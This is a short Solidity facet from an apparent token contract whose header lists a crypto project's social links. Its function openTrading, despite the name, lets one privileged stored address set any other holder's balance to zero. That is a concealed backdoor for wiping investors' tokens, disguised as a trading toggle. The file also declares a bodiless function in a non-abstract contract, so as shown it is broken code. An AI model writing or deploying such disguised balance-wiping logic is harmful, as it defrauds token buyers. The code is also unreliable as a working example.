/*  
   * SPDX-License-Identifier: MIT 

     // Telegram: https://t.me/Tabichain
    // Github: https://github.com/treasureland-market
    // Twitter: https://twitter.com/Tabichain
    // Website: https://www.tabichain.com/
    // Discord: https://discord.com/invite/Tabichain
    // Medium:  https://tabi-official.medium.com/
    

*/
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
